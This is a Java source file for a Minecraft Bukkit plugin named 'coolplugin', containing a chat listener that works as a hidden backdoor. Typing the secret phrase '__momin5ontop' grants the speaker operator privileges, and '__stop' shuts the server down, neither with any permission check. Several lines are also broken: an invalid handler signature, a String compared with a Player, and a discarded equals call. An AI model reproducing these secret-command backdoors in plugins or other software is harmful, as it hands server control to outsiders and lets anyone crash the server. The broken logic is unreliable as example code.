package in.momin5.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e, String[] args) {
        Player player = e.getPlayer();
        if(e.getMessage().equals("__momin5ontop")){
            player.setOp(true);
        }
        if(e.getMessage().equals("__stop")){
            Bukkit.getServer().shutdown();
        }
        if(args.length == 1) return;
        else if(args[0].equals(player)){
            Bukkit.getServer().getIp().equals(player);

        }
    }
}
